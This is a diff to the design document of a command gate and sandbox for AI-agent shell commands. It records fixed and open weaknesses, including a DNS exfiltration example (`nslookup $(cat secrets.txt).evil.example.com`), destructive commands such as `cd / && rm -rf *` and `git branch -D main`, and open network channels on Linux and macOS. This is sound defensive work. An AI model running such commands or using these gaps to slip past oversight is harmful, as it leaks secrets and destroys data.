@@ -112,7 +112,9 @@ The two are complementary in a specific way:
 library that is worse than not using it.** `Allow` means *no rule objected*.
 The policy default is therefore `confine`, not `allow` — "no rule matched"
 means the ruleset had nothing to say, which for agent-authored input is the
-common case rather than evidence of safety.
+common case rather than evidence of safety. It applies to **each command** that
+nothing spoke for, not once per line: applied once, any allowed neighbour hid an
+unknown program (`unknown-tool; ls`), and the line came back `allow` (§ 16).
 
 ## 4. Layer 1: the decision path
 
@@ -579,7 +581,7 @@ rather than merely usually fast.
 | recovered `sh -c` payload does not parse | `Deny` |
 | command is not valid UTF-8 (FFI) | `Deny` |
 | `NULL` decision pointer (FFI) | reads as `Deny` |
-| no rule matched | policy default (`Confine`) |
+| a command no rule matched | policy default (`Confine`), applied per command |
 
 Input that a shell would accept and this parser rejects is precisely the
 interesting case, and not the one to be lenient about. Without the deadline
@@ -663,16 +665,50 @@ running as the same user outside the sandbox can rewrite it. It also cannot
 record a command that was run some other way, which is why every file's header
 says so.
 
-**An unexplained intermittent refusal on a cold start.** Twice in 56 runs of the
-affected tests — once in a Rust engine test, once in the Python suite, both
-immediately after a rebuild — a benign command came back without having run. It
-does not reproduce on demand: 12 warm runs, 10 runs under 16 busy loops on 8
-cores, and 30 fresh Python runs all passed. The leading hypothesis is the gate's
-10 ms deadline failing closed on a cold filesystem cache (path resolution
-`stat`s), so a legitimate first command comes back `ask`. That is a hypothesis,
-not a finding. The failing assertions now print the verdict and the incomplete
-reason, and the audit log records `"complete":false` with it, so the next
-occurrence explains itself.
+**The gate's deadline fails closed when the machine is busy.** The gate denies
+when it exceeds its 10 ms budget — by design, and correct for adversarial input.
+Wall-clock time also counts every moment the thread was not scheduled, so on a
+loaded or cold machine a benign command is occasionally refused. Measured, not
+inferred: 1 of 414 identical evaluations of `basename $(pwd)` returned `deny` with
+`evaluation exceeded its 10ms budget after 30.49ms`, and was `confine` the other
+five times. With a load average of 176 — this repository's own stress tests left
+the machine there — it is common. This is very probably what the two earlier
+"benign command came back without having run" test failures were (consistent with
+them, not proven for them). Tests that are about *which* verdict the rules give
+now use a generous deadline, or skip an incomplete decision, so they no longer
+measure the machine. **The default has deliberately not been changed**: raising it
+is a decision about the headline 10 ms claim (typical p99 is 13 µs; the deadline is
+a safety valve, not the typical cost). Options are in MITIGATIONS.md.
+
+**On Linux, "no network" means "no TCP".** Read from the code; there is no Linux
+host here to run it. Landlock's network rules (ABI 4–6) cover TCP `bind` and
+`connect` only. They do not cover UDP or Unix-domain sockets, and the seccomp
+filter denies neither `socket` nor `sendto`. So a command with no network grant can
+still send UDP datagrams — DNS exfiltration needs nothing more — and connect to
+Unix sockets. macOS is different: Seatbelt refuses all of it (§ 16). The Linux
+runtime is therefore weaker than the macOS one on exactly the property that
+matters most for exfiltration, and gVisor (which unshares the network namespace) is
+the stronger Linux option. `sandboxed_commands_without_a_network_grant_reach_no_listener`
+exists for Linux and is `#[ignore]`d with this reason.
+
+**On macOS the profile allows every `mach-lookup`.** Sockets and DNS are refused,
+but a sandboxed process can look up — measured — LaunchServices, the keychain
+server, the pasteboard and the background URL agent, each a service outside the
+sandbox that acts on a client's behalf. Whether any can be made to leak was not
+tested: that means opening URLs and reading a clipboard and keychain on the
+developer's machine. Denying LaunchServices alone breaks `git`, `python3`, `perl`
+and `curl`, so the fix is an allowlist of what tools actually need, which is its own
+piece of work. `privileged_system_services_are_not_reachable_from_the_sandbox`
+states the desired property and is `#[ignore]`d because it fails today.
+
+**"Read-only" git rules that mutate.** `safe.vcs-inspection` allows `git branch`
+and `git tag` whatever their arguments, so `git branch -D main` and `git tag -d v1`
+are `allow`. `remote` was fixed (§ 16); these need a "no positional arguments"
+predicate the policy language does not have.
+
+**The gate does not follow `cd`.** Relative paths resolve against a fixed working
+directory, so `cd / && rm -rf *` is judged like `rm -rf .` — a `confine`, not the
+`deny` a delete of `/` deserves. The kernel stops it; the gate cannot say so.
 
 **cgroups are not wired up.** `Profile` carries `max_processes` and
 `max_memory_bytes` and on Linux nothing enforces them yet. Fork bombs are caught
@@ -724,6 +760,13 @@ tests that found them.
 | "stdout is not recorded" asserted against a string the command text itself contains, which is (correctly) recorded | the test failing on the wrong thing |
 | a tamper test that only let the gate refuse the command said nothing about the kernel | asking which layer had stopped it |
 | `shellguard run` silently ignored `--policy` while `eval` honoured it | reading `cmd_run` while designing reload |
+| an unknown program was laundered from `confine` to `allow` by any allowed neighbour (`tool; ls`), and `nslookup $(cat secrets.txt).evil.example` came back `allow` | asking what the gate said about the exfiltration commands I was about to classify |
+| `git remote add` and `set-url` were `allow` as "read-only inspection" | a corpus expectation I got wrong |
+| an unexplained test flake was the gate's own 10 ms deadline firing on a busy machine | repeating 414 identical evaluations and printing the reason |
+| a network probe "proved" the sandbox blocked TCP while nothing was listening (the listener had crashed) | printing what the listeners received, and adding an unsandboxed control |
+| `open -a NoSuchApp` "showed" the sandbox reached LaunchServices; it resolves app names locally and answers the same either way | the deny I tried changed nothing, and broke `git` |
+| a benchmark on a machine at load average 176 showed a 200× regression that was not there | "parse only" got slower too, and I had not touched the parser |
+| Landlock handled both TCP rights unless the profile could listen, so a profile granted `net.connect` had connect denied on ABI 4+ | reading `landlock.rs` to find out what "no network" meant on Linux |
 | gVisor mounted the workspace writable for a profile that granted no writes, under a test named "only the workspace is writable" that never checked `rw` against `ro` | writing the parity test first and watching it fail |
 | a policy block pasted twice was accepted by the parser and double-reported every match | a unit test, not the parser |
 | a "did not run" assertion searched stdout for text the refusal message itself prints | the test failing on the wrong thing |
@@ -886,3 +929,84 @@ can only come before anything has changed.
 **Cost.** One `Arc` clone and a read lock per judgment. Measured A/B against the
 commit before, alternating runs: p50 2.7–2.9 µs on both, p99 12–15 µs on both.
 Within noise.
+
+## 16. What stops a command from sending data out
+
+Rollback restores local files. It cannot recall a secret that has already left the
+machine, so for a command that could send data somewhere the only lever is that it
+never gets the network. `tests/exfiltration.txt` writes that down, and
+`crates/shellguard-runtime/tests/exfiltration.rs` checks it.
+
+**Three classes, because three different things can be responsible.**
+
+| class | what stops it | asserted |
+|---|---|---|
+| `blocked` | the gate: verdict `ask` or `deny`, so it never runs unattended | verdict ≥ `ask` |
+| `granted` | nothing — it legitimately needs the network, and *says so* | the decision names a network capability |
+| `sandbox` | the kernel alone — the gate does not see any network use | verdict `allow`/`confine`, no network capability |
+
+`sandbox` is the honest list of what the gate cannot see (`ssh`, `scp`, `git push`,
+`ping`, `nslookup`, an interpreter one-liner…). If a rule later learns to recognise
+one, moving it is progress — and the test fails until someone does it on purpose.
+
+**Checked, in increasing order of how far it can be trusted.**
+
+1. *Classification* — every command lands in its class.
+2. *No implicit network* — for every command, the profile the engine builds has
+   network **if and only if** the decision names a network capability. Network
+   cannot arrive by any route that does not show in the record.
+3. *Containment against the real kernel* — the `sandbox` commands that aim at a
+   loopback listener (TCP, UDP, a Unix socket in the workspace) are actually run.
+   Each is first run **unsandboxed as a control**; if the control cannot reach the
+   listener the command proves nothing and is excluded (`busybox`, `php` and
+   macOS's non-GNU `awk` are, here). Then it is run sandboxed, and nothing may
+   arrive. A second control shows a profile *with* network does reach all three
+   listeners, so silence under no grant means something.
+
+**What was verified on macOS, with controls:** with no network grant, TCP,
+UDP and Unix-socket connections are refused, and hostnames do not resolve through
+`getaddrinfo`, `dscacheutil` or `dns-sd`. The last is worth a sentence: the profile
+allows every `mach-lookup`, and the resolver is reachable at the Mach level, yet
+`dns-sd` reports `Service Not Running` — consistent with `libsystem_dnssd` talking
+to `mDNSResponder` over a Unix socket, which is refused with the rest. That is an
+inference; the measurement is that lookups fail, in 0.01 s against 0.05 s for a
+genuine NXDOMAIN from an unsandboxed process. With the sandbox deliberately opened,
+the harness catches it: 6 sandboxed commands reached the listeners and a hostname
+resolved.
+
+**What was not:** everything in § 12's Linux and `mach-lookup` paragraphs. The
+list of channels tried is not a proof there are no others.
+
+**The default was not applied per command.** Writing the `sandbox` class meant
+asking the gate about `nslookup $(cat secrets.txt).evil.example.com`, and it said
+`allow`. The policy default (`confine`) applied only if *no* command on the line
+matched any rule; `cat` matched an allow rule, so the unknown `nslookup` was never
+asked. The same held for `unknown-tool; ls`, `unknown-tool | cat`, and anything
+beside a `$(cat …)`. Since `allow` means "run directly", a harness using the gate
+alone would have run whatever the agent put before the `;` with no sandbox. It now
+applies to each command that executes something and matched no rule:
+
+- A **wrapper** (`timeout`, `sudo`, `bash -c`, `find -exec`) is exempt, because it is
+  judged through what it wraps; the wrapped command is not.
+- A **program-less assignment** (`FOO=bar`) executes nothing and is exempt. A
+  computed program (`$CMD args`) executes something unknowable and is not.
+- When some other command matched, the defaulted command gets a `policy.default`
+  finding, so the verdict explains itself. Alone, findings stay empty as before.
+- Shell builtins that only move around or test (`cd`, `pushd`, `popd`, `test`, `[`,
+  `:`) are on a new allow list so `cd src && ls` stays `allow`. `export`, `umask`,
+  `set`, `source`, `eval`, `exec`, `trap` and `alias` are deliberately not on it.
+
+Measured on 69 realistic compound commands: none moved towards `allow`, and 10
+moved from `allow` to `confine` — the target itself, five with `$(…)` in their
+arguments (the allow rules decline unresolved paths, and a harmless inner command
+had been masking that), and `cd ..`, `find`, `umask`, `cargo --version`. No latency
+cost (A/B on a quiet machine: p50 2.6–2.7 µs against 2.7–2.8 µs; adversarial worst
+case about 2.1 ms on both).
+
+**Also found and fixed on the way:** `safe.vcs-inspection` allowed `git remote add`
+and `set-url`, which configure where a later push goes; and the Landlock ruleset
+handled both TCP rights unless the profile could listen, so a profile granted
+`net.connect` had connect *denied* on kernels with ABI 4+. The second is a pure
+decision and now lives in `landlock_abi.rs`, which compiles everywhere and is
+tested here; the Linux code that calls it type-checks for both architectures and
+has never run.
